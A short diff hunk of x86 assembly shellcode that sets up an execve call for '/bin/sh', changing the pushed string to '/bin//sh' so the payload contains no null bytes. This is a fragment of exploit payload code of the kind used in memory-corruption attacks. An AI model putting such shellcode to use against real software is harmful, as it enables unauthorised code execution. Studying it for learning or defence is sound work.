@@ -119,8 +119,8 @@ mov    al,0xb
 ; push 0x0 
 xor esi,esi
 push   esi 
-; "/bin/sh" 
-push   0x0068732f ; "/sh" 
+; "/bin//sh to avoid null on 4 bytes" 
+push   0x68732f2f ; "//sh" 
 push   0x6e69622f ; "/bin"
 ; we create a string pointer 
 mov    ebx,esp
